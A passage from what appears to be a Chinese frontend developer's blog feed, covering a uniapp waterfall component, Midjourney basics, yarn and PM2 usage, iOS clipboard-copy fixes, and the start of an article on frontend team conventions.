<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> cacheType = &#123;</span><br><span class="line">    <span class="attr">tag</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    <span class="attr">list</span>: [],</span><br><span class="line">    <span class="attr">currentPage</span>: <span class="number">1</span>,</span><br><span class="line">    <span class="attr">scrollTop</span>: <span class="number">0</span>,</span><br><span class="line">    <span class="attr">noMore</span>: <span class="literal">false</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>缓存方式</p>
<p>本地存储，状态管理如 vuex，临时缓存基于当前页…</p>
<h3 id="图片懒加载"><a href="#图片懒加载" class="headerlink" title="图片懒加载"></a>图片懒加载</h3><p>很多时候我们需要将页面内未出现在可视区域内的图片先不做加载， 等到滚动到可视区域后再去加载，即图片赖加载。</p>
<p>懒加载的主要目的是减少页面加载时的请求次数，从而提高页面加载速度和用户体验。</p>
<p>可采用 <a href="https://developer.mozilla.org/zh-CN/docs/Web/API/IntersectionObserver">IntersectionObserver</a>实现，uniapp 对应的 <a href="https://uniapp.dcloud.net.cn/api/ui/intersection-observer.html#createintersectionobserver">uni.createIntersectionObserver</a>。</p>
<p>IntersectionObserver 兼容性，<a href="https://caniuse.com/?search=IntersectionObserver">详见</a></p>
<h2 id="兼容与取舍"><a href="#兼容与取舍" class="headerlink" title="兼容与取舍"></a>兼容与取舍</h2><p>合适的才是最优解。</p>
<p>Github 上的排<code>Sort: Best match</code>前 4 个解决方案</p>
<table>
<thead>
<tr>
<th>名称</th>
<th>优点</th>
<th>缺点</th>
</tr>
</thead>
<tbody><tr>
<td>vue-waterfall</td>
<td>start 数最多的一个方案</td>
<td>需要在组件渲染前知道图片的宽度和高度，而我们一般并不会在接口中返回这些数据</td>
</tr>
<tr>
<td>vue-waterfall-easy</td>
<td>无需提前获取图片的宽高信息，采用图片预加载后再进行排版</td>
<td>耦合下拉、无限加载组件；包含 PC 端等逻辑，包体积较大，对于追求性能的页面并不友好（作为开源方案，兼容更多的场景其实无可厚非，只是这些功能我们都已经有单独的组件实现）；一次加载所有图片，不支持懒加载</td>
</tr>
<tr>
<td>vue-waterfall2</td>
<td>支持高度自适应，支持懒加载</td>
<td>内部多次创建 image 对象，同时还伴随着大量的计算和滚动监听。</td>
</tr>
<tr>
<td>vue2-waterfall</td>
<td>通过对 masonry-layout 和 imagesloaded 这两个开源方案的封装来实现，逻辑简单明了。</td>
<td>不支持懒加载</td>
</tr>
</tbody></table>
<p><a href="https://github.com/search?q=vue-waterfall">详见</a></p>
<h2 id="issues"><a href="#issues" class="headerlink" title="issues"></a>issues</h2><h3 id="1-图片加载是个异步过程，页面渲染获取列高度不准确"><a href="#1-图片加载是个异步过程，页面渲染获取列高度不准确" class="headerlink" title="1 图片加载是个异步过程，页面渲染获取列高度不准确"></a>1 图片加载是个异步过程，页面渲染获取列高度不准确</h3><p>图片没加载出来，图片高度还没有，就去获取列高度引起的。元素高度不固定，且无法预估高度，只能等渲染之后才可以确定高度。</p>
<p>解决：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> img = <span class="keyword">new</span> <span class="title class_">Image</span>()</span><br><span class="line">img.<span class="property">src</span> = <span class="string">&#x27;url&#x27;</span></span><br><span class="line">img.<span class="property">load</span> = <span class="function">(<span class="params">e</span>) =&gt;</span> &#123;&#125;</span><br><span class="line">img.<span class="property">error</span> = <span class="function">(<span class="params">e</span>) =&gt;</span> &#123;&#125;</span><br></pre></td></tr></table></figure>

<p>当然，img 标签中支持 load 和 error 事件。</p>
<h3 id="2-瀑布流与-tab-组合场景，快速来回切换多个-tab，上一个-tab-在当前-tab-中渲染"><a href="#2-瀑布流与-tab-组合场景，快速来回切换多个-tab，上一个-tab-在当前-tab-中渲染" class="headerlink" title="2 瀑布流与 tab 组合场景，快速来回切换多个 tab，上一个 tab 在当前 tab 中渲染"></a>2 瀑布流与 tab 组合场景，快速来回切换多个 tab，上一个 tab 在当前 tab 中渲染</h3><p>上一个接口请求未中断，最终 push 到了 list。加 apiFlag 标识判断。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title function_">data</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> &#123;</span><br><span class="line">     <span class="comment">// 记录tab频繁切换时接口List请求的索引</span></span><br><span class="line">    <span class="attr">getListIndex</span>: <span class="number">0</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;,</span><br><span class="line"><span class="attr">methods</span>: &#123;</span><br><span class="line">  <span class="title function_">getList</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> currentIndex = <span class="variable language_">this</span>.<span class="property">getListIndex</span>;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">getListIndex</span>++;</span><br><span class="line">    <span class="variable language_">this</span>.$ajax(<span class="string">&#x27;apiName&#x27;</span>, <span class="function">(<span class="params">res</span>) =&gt;</span> &#123;</span><br><span class="line">     <span class="comment">// ...</span></span><br><span class="line">     <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">getListIndex</span> === currentIndex) &#123;</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">     &#125;</span><br><span class="line">   &#125;)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="3-触底加载时内容重渲染"><a href="#3-触底加载时内容重渲染" class="headerlink" title="3 触底加载时内容重渲染"></a>3 触底加载时内容重渲染</h3><p>子组件的多个 props 更新时间不一致引起。</p>
<h3 id="4-当前页未渲染完成就触发下一页引起单列渲染"><a href="#4-当前页未渲染完成就触发下一页引起单列渲染" class="headerlink" title="4 当前页未渲染完成就触发下一页引起单列渲染"></a>4 当前页未渲染完成就触发下一页引起单列渲染</h3><p>需要加一个 renderedFlag 标识判断。</p>
<h3 id="5-uniapp-v-for-内用插槽只兼容微信小程序-2-18-0-版本以下"><a href="#5-uniapp-v-for-内用插槽只兼容微信小程序-2-18-0-版本以下" class="headerlink" title="5 uniapp v-for 内用插槽只兼容微信小程序 2.18.0 版本以下"></a>5 uniapp v-for 内用插槽只兼容微信小程序 2.18.0 版本以下</h3><h3 id="6-uniapp-瀑布流图片格式移动端设备不兼容"><a href="#6-uniapp-瀑布流图片格式移动端设备不兼容" class="headerlink" title="6 uniapp 瀑布流图片格式移动端设备不兼容"></a>6 uniapp 瀑布流图片格式移动端设备不兼容</h3><p>如<code>.avif</code>，只兼容 PC</p>
<p>了解更多，<a href="https://developer.mozilla.org/zh-CN/docs/Web/Media/Formats/Image_types">详见</a></p>
<h2 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h2><p>[1] <a href="https://gitee.com/umicro/uView/blob/master/uview-ui/components/u-waterfall/u-waterfall.vue">uview 1.x u-waterfall</a></p>
<p>[2] <a href="https://github.com/cool-team-official/cool-uni/blob/master/components/cl-waterfall/cl-waterfall.vue">cool-uni master cl-waterfall</a></p>
<p>[3] <a href="https://juejin.cn/post/7086330043038695432">教你如何实现一个完美的移动端瀑布流组件</a></p>
<p>[4] <a href="https://gitee.com/umicro/uView/blob/master/uview-ui/components/u-lazy-load/u-lazy-load.vue">uview 1.x u-lazy-laod</a></p>
]]></content>
      <categories>
        <category>工作点滴</category>
      </categories>
      <tags>
        <tag>Vue</tag>
        <tag>uniapp</tag>
      </tags>
  </entry>
  <entry>
    <title>命运</title>
    <url>/2023/03/25/20230325-%E5%91%BD%E8%BF%90/</url>
    <content><![CDATA[<p>命运有三次转折点: 原生家庭、夫妻伴侣与觉醒的自己。</p>
<p><img src="https://cdn.huatree.top/image-20230325153654068.png" alt="image-20230325153654068"></p>
<span id="more"></span>
<p>如果没有优越的家庭和如意的伴侣，那么就一定要唤醒那个强大的自己。如果你整天都不读书，不运动，不节制消费，不反省自律，无兴趣无爱好，无目标、无期望，生活是不会变好的。好起来的从来都不是生活而是你自己。</p>
<p>趁现在还有时间，尽自己最大的努力，努力做成你想做的那件事，成为你想成为的人。也许我们始终都只是个小人物，但这并不妨碍我们选择什么样的方式活下去</p>
]]></content>
      <categories>
        <category>生活滋味</category>
      </categories>
      <tags>
        <tag>修行悟道</tag>
      </tags>
  </entry>
  <entry>
    <title>绘画AI之Midjourney</title>
    <url>/2023/03/25/20230325-%E7%BB%98%E7%94%BBAI%E4%B9%8BMidjourney/</url>
    <content><![CDATA[<p>加入 Discord 或 Web 上的 Midjourney 社区，数以千计的人在这里合作，通过简短的文字描述创造新的世界、奇妙的角色和独特的图像。</p>
<p><img src="https://cdn.huatree.top/image-20230325203503295.png" alt="image-20230325203503295"></p>
<span id="more"></span>

<blockquote>
<p><a href="https://docs.midjourney.com/">官方文档</a></p>
</blockquote>
<h2 id="关于Midjourney"><a href="#关于Midjourney" class="headerlink" title="关于Midjourney"></a>关于Midjourney</h2><p>Midjourney 是一个独立的研究实验室，致力于探索新的思维方式并扩展人类的想象力。</p>
<p>了解更多，<a href="https://www.midjourney.com/home/?callbackUrl=/app/">详见</a></p>
<h2 id="快速开始"><a href="#快速开始" class="headerlink" title="快速开始"></a>快速开始</h2><p>了解如何使用 Discord 上的 Midjourney Bot 根据简单的文本提示创建自定义图像。</p>
<h3 id="加入Discord"><a href="#加入Discord" class="headerlink" title="加入Discord"></a>加入Discord</h3><p>前往 Midjourney.com，选择<strong>加入 Beta</strong>，或直接前往<a href="https://discord.gg/midjourney">Midjourney Discord</a>。</p>
<p>在加入 Midjourney Discord 服务器之前，您必须登录 Discord。<br><a href="https://support.discord.com/hc/en-us/articles/360033931551-Getting-Started">在此处了解如何创建一个</a>。</p>
<h3 id="寻找新手频道"><a href="#寻找新手频道" class="headerlink" title="寻找新手频道"></a>寻找新手频道</h3><p>在登录后的Discord界面，选择<code>newbies-#</code>左侧边栏中可见的任何频道。</p>
<p><img src="https://cdn.huatree.top/image-20230325200507042.png" alt="image-20230325200507042"></p>
<h3 id="使用-x2F-imagine-命令"><a href="#使用-x2F-imagine-命令" class="headerlink" title="使用 &#x2F;imagine 命令"></a>使用 &#x2F;imagine 命令</h3><p>使用命令与 Discord 上的 Midjourney Bot 交互。命令用于创建图像、更改默认设置、监视用户信息以及执行其他有用的任务。该<code>/imagine</code>命令从简短的文本描述（称为Prompt）生成一个独特的图像。</p>
<ol>
<li>从斜杠命令弹出窗口中键入<code>/imagine prompt:</code>或选择命令。<code>/imagine</code></li>
<li>在“提示”字段中输入您要创建的图像的描述。</li>
<li>单击返回以发送您的消息。</li>
</ol>
<p>尊重<a href="https://docs.midjourney.com/community-guidelines">社区准则</a>。社区准则适用于任何使用 Midjourney Bot 的地方。</p>
<p><img src="https://cdn.huatree.top/image-20230325200937950.gif" alt="image-20230325200937950"></p>
<h3 id="处理作业"><a href="#处理作业" class="headerlink" title="处理作业"></a>处理作业</h3><p>Midjourney Bot 需要大约一分钟的时间来生成四个选项。</p>
<p>生成图像会激活免费的 Midjourney 试用版。试用用户在需要订阅之前可以完成大约 25 个工作。</p>
<p>作业是使用 Midjourney Bot 的任何操作。工作包括使用<code>/imagine</code>命令创建图像网格、放大图像或创建图像变体，全部使用您的免费试用时间。</p>
<p>使用<code>/info</code>命令检查你的快速剩余时间查看您的剩余试用时间。</p>
<p><img src="https://cdn.huatree.top/image-20230325201310849.gif" alt="image-20230325201310849"></p>
<h3 id="高档或创造变化"><a href="#高档或创造变化" class="headerlink" title="高档或创造变化"></a>高档或创造变化</h3><p>初始图像网格生成完成后，会出现两行按钮：</p>
<p><img src="https://cdn.huatree.top/image-20230325201520299.png" alt="image-20230325201520299"></p>
<h3 id="保存你的图像"><a href="#保存你的图像" class="headerlink" title="保存你的图像"></a>保存你的图像</h3><p>单击图像以全尺寸打开它，然后右键单击并选择<code>Save image</code>。在手机上，长按图片，然后点击右上角的下载图标。</p>
<p>所有图片均可立即在<a href="https://www.midjourney.com/app/">midjourney.com&#x2F;app</a><code>Sign In with Discord</code>上查看。</p>
<h3 id="订阅计划"><a href="#订阅计划" class="headerlink" title="订阅计划"></a>订阅计划</h3><p>试用用户大约有 25 个免费工作。工作目前不会过期，但也不会更新。要制作更多图像，请使用<code>/subscribe</code>任何机器人频道中的命令生成指向Discord帐户页面的个人链接。</p>
<h2 id="销售你的绘画指令"><a href="#销售你的绘画指令" class="headerlink" title="销售你的绘画指令"></a>销售你的绘画指令</h2><p>如果你有好的绘画指令，怎么去把你的指令卖出去呢？</p>
<p>查找最佳指令，产生更好的结果，节省 API 成本，销售您自己的指令，可通过指令交易市场<a href="https://promptbase.com/">https://promptbase.com/</a>上进行交易。这就是利用AI创造价值获得收益的一种方式。</p>
]]></content>
      <categories>
        <category>生活滋味</category>
      </categories>
      <tags>
        <tag>AI</tag>
        <tag>绘画</tag>
      </tags>
  </entry>
  <entry>
    <title>yarn常用命令</title>
    <url>/2021/04/02/20230402-yarn%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/</url>
    <content><![CDATA[<p>Yarn 是一个软件包管理器，还可以作为项目管理工具。无论你是小型项目还是大型单体仓库（monorepos），无论是业余爱好者还是企业用户，Yarn 都能满足你的需求。</p>
<span id="more"></span>

<blockquote>
<p><a href="https://www.yarnpkg.cn/cli/install">yarn 官方文档</a></p>
</blockquote>
<h2 id="好用的命令"><a href="#好用的命令" class="headerlink" title="好用的命令"></a>好用的命令</h2><p>我们想安装一个指定版本的依赖包，兼容其他依赖包。我们也不确定需要哪个版本，所以需要尝试一下不同的版本。这时，需要查这个依赖包所有的版本了，下面的命令就犹如雪中送炭。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 查询需要安装的依赖包所有的版本号</span></span><br><span class="line">yarn info [package] versions</span><br></pre></td></tr></table></figure>

<p>了解更多，<a href="https://www.yarnpkg.cn/cli/info">详见</a></p>
<h3 id="显示命令列表"><a href="#显示命令列表" class="headerlink" title="显示命令列表"></a>显示命令列表</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">yarn <span class="built_in">help</span></span><br></pre></td></tr></table></figure>

<h3 id="更新依赖项"><a href="#更新依赖项" class="headerlink" title="更新依赖项"></a>更新依赖项</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">yarn up [package]</span><br><span class="line">yarn up [package]@[version]</span><br><span class="line">yarn up [package]@[tag]</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>成长经历</category>
      </categories>
      <tags>
        <tag>yarn</tag>
        <tag>包管理</tag>
      </tags>
  </entry>
  <entry>
    <title>为什么Node应用需要PM2</title>
    <url>/2023/05/08/20230508-%E4%B8%BA%E4%BB%80%E4%B9%88Node%E5%BA%94%E7%94%A8%E9%9C%80%E8%A6%81PM2/</url>
    <content><![CDATA[<p>Node应用跑在服务器上，我们不直接运行node应用，而是通过pm2来跑。为什么需要用pm2呢？</p>
<p><img src="https://cdn.huatree.top/image-20230508214003757.png" alt="image-20230508214003757"></p>
<span id="more"></span>

<h2 id="pm2是什么"><a href="#pm2是什么" class="headerlink" title="pm2是什么"></a>pm2是什么</h2><blockquote>
<p><a href="https://pm2.keymetrics.io/docs/usage/pm2-doc-single-page/">官网文档</a></p>
</blockquote>
<p>PM2 是一个守护进程管理器，它将帮助您管理和保持您的应用程序在线。</p>
<p>pm2是可以用于生产环境的Nodejs的进程管理工具，并且它内置一个负载均衡。它不仅可以<strong>保证服务不会中断</strong>一直在线，并且提供0秒reload功能，还有其他一系列进程管理、监控功能。并且使用起来非常简单。</p>
<p>最好的用处就是监控我们的生产环境下的node程序运行状态，让它给我们日以继日的处于工作状态。</p>
<h2 id="为什么要用pm2"><a href="#为什么要用pm2" class="headerlink" title="为什么要用pm2"></a>为什么要用pm2</h2><p>回答这个问题前，我们不妨先想一想：</p>
<ul>
<li><p>如果你的 node 应用跑的时候突然抛了个错，崩溃了，是不是需要重新跑起来？这时候是不是就需要另一个进程来自动做重启这件事情？</p>
</li>
<li><p>node 应用的日志默认输出在控制台，如果想输出到不同的日志文件，是不是可以让另一个进程获取 node 应用的输出，然后写文件来实现？</p>
</li>
<li><p>node 是单线程的，而机器是多个 cpu 的，为了充分利用 cpu 的能力，我们会用多个进程来跑 node 应用，这种通用逻辑是不是也可以放到一个单独进程里来实现？</p>
</li>
<li><p>node 运行时的 cpu、内存等资源的占用，是不是需要监控？这时候是不是可以让另一个进程来做？</p>
</li>
</ul>
<p>线上的 node 应用不只是跑起来就行了，还要做自动重启、日志、多进程、监控这些事情。而这些事情， pm2可以担当。</p>
<p>再来看看使用pm2可拥有的能力：</p>
<ul>
<li>日志管理；两种日志，pm2系统日志与管理的进程日志，默认会把进程的控制台输出记录到日志中；</li>
<li>负载均衡：PM2可以通过创建共享同一服务器端口的多个子进程来扩展您的应用程序。这样做还允许以零秒停机时间重新启动应用程序。</li>
<li>终端监控：可以在终端中监控应用程序并检查应用程序运行状况（CPU使用率，使用的内存，请求&#x2F;分钟等）。</li>
<li>SSH部署：自动部署，避免逐个在所有服务器中进行ssh。</li>
<li>静态服务：支持静态服务器功能</li>
<li>支持开发调试模式，非后台运行，<code>pm2-dev start &lt;appName&gt;</code>；</li>
<li>……</li>
</ul>
<h2 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h2><p>[1] <a href="https://mp.weixin.qq.com/s/S8Gw2XzuflnN2QMSVXhLhg">为什么 Node 应用要用 PM2 来跑？</a></p>
]]></content>
      <categories>
        <category>成长经历</category>
      </categories>
      <tags>
        <tag>PM2</tag>
        <tag>Node</tag>
      </tags>
  </entry>
  <entry>
    <title>uniapp文本复制到剪切版的坑</title>
    <url>/2023/06/21/20230621-uniapp%E6%96%87%E6%9C%AC%E5%A4%8D%E5%88%B6%E5%88%B0%E5%89%AA%E5%88%87%E7%89%88%E7%9A%84%E5%9D%91/</url>
    <content><![CDATA[<p>事情发生的很奇怪，复制功能用的<code>vue-clipboard2</code>依赖库，部分 ios 手机用户，商城购物时，复制订单号有效，但没法粘贴。排查下来，问题锁定在 ios 手机升级的新系统版本，无法复制有效，粘贴无效。</p>
<span id="more"></span>

<h2 id="复制粘贴功能的实现"><a href="#复制粘贴功能的实现" class="headerlink" title="复制粘贴功能的实现"></a>复制粘贴功能的实现</h2><h3 id="execCommand-方法"><a href="#execCommand-方法" class="headerlink" title="execCommand 方法"></a><code>execCommand</code> 方法</h3><p>用法，<a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Document/execCommand">详见</a></p>
<p>该方法已被弃用，但不影响正常使用。它允许运行命令来操纵可编辑内容区域的元素。使用方式如下：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">copyText</span> = (<span class="params">val</span>) =&gt; &#123;</span><br><span class="line">    <span class="keyword">const</span> textArea = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;textArea&#x27;</span>);</span><br><span class="line">    textArea.<span class="property">value</span> = val;</span><br><span class="line">    <span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(textArea);</span><br><span class="line">    textArea.<span class="title function_">select</span>();</span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">execCommand</span>(<span class="string">&#x27;copy&#x27;</span>);</span><br><span class="line">    <span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">removeChild</span>(textArea);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>复测了下，发现 ios 手机在浏览器下，点击复制按钮，整个页面会跳动一下。查起原因，创建的<code>textArea</code>不在页面可视区域之内，然后执行<code>textArea.select()</code>，就会触发浏览器的控件跳转行为，页面会滚动到 <code>textArea</code> 所在位置。然后执行完又快速移除了，就会形成闪动的这么一个现状。</p>
<p>那就给元素加固定定位。修改后的代码如下：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> textArea = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;textArea&#x27;</span>);</span><br><span class="line">textArea.<span class="property">value</span> = val || <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">textArea.<span class="property">style</span>.<span class="property">cssText</span> = <span class="string">&#x27;position: fixed; top: -999px; left: -999px; opacity: 0;&#x27;</span>;</span><br><span class="line">textArea.<span class="title function_">setAttribute</span>(<span class="string">&#x27;readonly&#x27;</span>, <span class="string">&#x27;readonly&#x27;</span>);</span><br><span class="line"><span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(textArea);</span><br><span class="line"></span><br><span class="line">textArea.<span class="title function_">select</span>();</span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">execCommand</span>(<span class="string">&#x27;copy&#x27;</span>);</span><br><span class="line"><span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">removeChild</span>(textArea);</span><br></pre></td></tr></table></figure>

<p>复测下，体验正常了。</p>
<h3 id="navigator-clipboard"><a href="#navigator-clipboard" class="headerlink" title="navigator.clipboard"></a>navigator.clipboard</h3><p>用法，<a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Navigator/clipboard">详见</a></p>
<p>这是个异步的方法，兼容性不太好，Safari 支持 13.1 及以上的。结合 execCommand 代码如下：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">copyText</span> = <span class="keyword">async</span> (<span class="params">val</span>) =&gt; &#123;</span><br><span class="line">    <span class="keyword">if</span> (navigator.<span class="property">clipboard</span> &amp;&amp; navigator.<span class="property">permissions</span>) &#123;</span><br><span class="line">        <span class="keyword">await</span> navigator.<span class="property">clipboard</span>.<span class="title function_">writeText</span>(val);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> textArea = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;textArea&#x27;</span>);</span><br><span class="line">        textArea.<span class="property">value</span> = val || <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        textArea.<span class="property">style</span>.<span class="property">cssText</span> = <span class="string">&#x27;position: fixed; top: -999px; left: -999px; opacity: 0;&#x27;</span>;</span><br><span class="line">        textArea.<span class="title function_">setAttribute</span>(<span class="string">&#x27;readonly&#x27;</span>, <span class="string">&#x27;readonly&#x27;</span>);</span><br><span class="line">        <span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(textArea);</span><br><span class="line"></span><br><span class="line">        textArea.<span class="title function_">select</span>();</span><br><span class="line">        <span class="variable language_">document</span>.<span class="title function_">execCommand</span>(<span class="string">&#x27;copy&#x27;</span>);</span><br><span class="line">        <span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">removeChild</span>(textArea);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="调用-APP-交互-SDK-方法"><a href="#调用-APP-交互-SDK-方法" class="headerlink" title="调用 APP 交互 SDK 方法"></a>调用 APP 交互 SDK 方法</h3><p>也只能局限于 APP 端内 H5 使用，端外 H5 已然得用上面的方法。</p>
<h3 id="uni-setClipboardData"><a href="#uni-setClipboardData" class="headerlink" title="uni.setClipboardData"></a>uni.setClipboardData</h3><p>用法，<a href="https://uniapp.dcloud.net.cn/api/system/clipboard.html#setclipboarddata">详见</a></p>
<h2 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h2><p>[1] <a href="https://sayhub.me/blog/copy-text/">JS 复制文字到剪贴板的坑及完整方案</a></p>
]]></content>
      <categories>
        <category>工作点滴</category>
      </categories>
      <tags>
        <tag>uniapp</tag>
      </tags>
  </entry>
  <entry>
    <title>面试官：如果你是前端leader，你会做哪些前端基础建设？</title>
    <url>/2023/08/17/20230817-%E9%9D%A2%E8%AF%95%E5%AE%98%EF%BC%9A%E5%A6%82%E6%9E%9C%E4%BD%A0%E6%98%AF%E5%89%8D%E7%AB%AFleader%EF%BC%8C%E4%BD%A0%E4%BC%9A%E5%81%9A%E5%93%AA%E4%BA%9B%E5%89%8D%E7%AB%AF%E5%9F%BA%E7%A1%80%E5%BB%BA%E8%AE%BE%EF%BC%9F/</url>
    <content><![CDATA[<p>今天为大家分享一篇关于前端基建的文章，当团队达到3个人+的时候，前端的基础建设就显得更为重要了。良好的基础建设可以保证代码的规范性、可读性和可维护性，从而提高整体代码质量;共享的公共组件和函数库可以减少重复开发，前端工程模板和接口规范可以提高开发效率;统一的规范和标准可以减少潜在的错误和问题，提高项目的稳定性和可靠性。</p>
<p><img src="https://cdn.huatree.top/image-20230817230102162.jpg" alt="image-20230817230102162"></p>
<span id="more"></span>

<div class="note info"><p>文章转载自 <a href="https://juejin.cn/post/7256393626682163237">Ausra 无忧</a></p>
</div>

<p>如果恰巧你所在的公司前端都在各自为营，那你可以好好看看这篇文章，希望对你有所启发。</p>
<h2 id="项目目录规范"><a href="#项目目录规范" class="headerlink" title="项目目录规范"></a>项目目录规范</h2><p>文件目录组织现在常用的有两种方式，后面公司采用的第二种，更方便一些。两种方式没有最好的，只有更适合自己公司的，只要公司内部达成一致了，用哪一种都会很方便。</p>
<h3 id="按功能类型来划分"><a href="#按功能类型来划分" class="headerlink" title="按功能类型来划分"></a>按功能类型来划分</h3><p>按文件的功能类型来分，<strong>「比如api」</strong>，<strong>「组件」</strong>，<strong>「页面」</strong>，<strong>「路由」</strong>，<strong>「hooks」</strong>，<strong>「store」</strong>，不管是全局使用到的，还是单独页面局部使用到的，都按照功能类型放在<strong>「src」</strong>下面对应的目录里面统一管理。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">├─src               <span class="comment">#  项目目录</span></span><br><span class="line">│  ├─api                <span class="comment">#  数据请求</span></span><br><span class="line">│  │  └─Home            <span class="comment">#  首页页面api</span></span><br><span class="line">│  │  └─Kind            <span class="comment">#  分类页面api</span></span><br><span class="line">│  ├─assets             <span class="comment">#  资源</span></span><br><span class="line">│  │  ├─css             <span class="comment">#  css资源</span></span><br><span class="line">│  │  └─images          <span class="comment">#  图片资源</span></span><br><span class="line">│  ├─config             <span class="comment">#  配置</span></span><br><span class="line">│  ├─components         <span class="comment">#  组件</span></span><br><span class="line">│  │  ├─common            <span class="comment">#  公共组件</span></span><br><span class="line">│  │  └─Home              <span class="comment">#  首页页面组件</span></span><br><span class="line">│  │  └─Kind              <span class="comment">#  分类页面组件</span></span><br><span class="line">│  ├─layout             <span class="comment">#  布局</span></span><br><span class="line">│  ├─hooks              <span class="comment">#  自定义hooks组件</span></span><br><span class="line">│  ├─routes             <span class="comment">#  路由</span></span><br><span class="line">│  ├─store              <span class="comment">#  状态管理</span></span><br><span class="line">│  │  └─Home              <span class="comment">#  首页页面公共的状态</span></span><br><span class="line">│  │  └─Kind              <span class="comment">#  分类页面公共的状态</span></span><br><span class="line">│  ├─pages              <span class="comment">#  页面</span></span><br><span class="line">│  │  └─Home              <span class="comment">#  首页页面</span></span><br><span class="line">│  │  └─Kind              <span class="comment">#  分类页面</span></span><br><span class="line">│  ├─utils              <span class="comment">#  工具</span></span><br><span class="line">│  └─main.ts            <span class="comment">#  入口文件</span></span><br></pre></td></tr></table></figure>

<h3 id="按领域模型划分"><a href="#按领域模型划分" class="headerlink" title="按领域模型划分"></a>按领域模型划分</h3><p>按照页面功能划分，全局会用到的<strong>「组件」</strong>，<strong>「api」</strong>等还是放到<strong>「src」</strong>下面全局管理，页面内部单独使用的<strong>「api」</strong>和<strong>「组件」</strong>放到对应页面的文件夹里面，使用的时候不用上下查找文件，在当前页面文件夹下就能找到，比较方便，功能也内聚一些。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">├─src               <span class="comment">#  项目目录</span></span><br><span class="line">│  ├─assets             <span class="comment">#  资源</span></span><br><span class="line">│  │  ├─css             <span class="comment">#  css资源</span></span><br><span class="line">│  │  └─images          <span class="comment">#  图片资源</span></span><br><span class="line">│  ├─config             <span class="comment">#  配置</span></span><br><span class="line">│  ├─components         <span class="comment">#  公共组件</span></span><br><span class="line">│  ├─layout             <span class="comment">#  布局</span></span><br><span class="line">│  ├─hooks              <span class="comment">#  自定义hooks组件</span></span><br><span class="line">│  ├─routes             <span class="comment">#  路由</span></span><br><span class="line">│  ├─store              <span class="comment">#  全局状态管理</span></span><br><span class="line">│  ├─pages              <span class="comment">#  页面</span></span><br><span class="line">│  │  └─Home              <span class="comment">#  首页页面</span></span><br><span class="line">│  │    └─components      <span class="comment">#  Home页面组件文件夹</span></span><br><span class="line">│  │    ├─api             <span class="comment">#  Home页面api文件夹</span></span><br><span class="line">│  │    ├─store           <span class="comment">#  Home页面状态</span></span><br><span class="line">│  │    ├─index.tsx       <span class="comment">#  Home页面</span></span><br><span class="line">│  │  └─Kind              <span class="comment">#  分类页面</span></span><br><span class="line">│  ├─utils              <span class="comment">#  工具</span></span><br><span class="line">│  └─main.ts            <span class="comment">#  入口文件</span></span><br></pre></td></tr></table></figure>

<h2 id="代码书写规范"><a href="#代码书写规范" class="headerlink" title="代码书写规范"></a>代码书写规范</h2><p>规范比较多，这里只简单列举一下基本的规范约束和使用工具来自动化规范代码。</p>
<h3 id="组件结构"><a href="#组件结构" class="headerlink" title="组件结构"></a>组件结构</h3><p><strong>react组件：</strong></p>
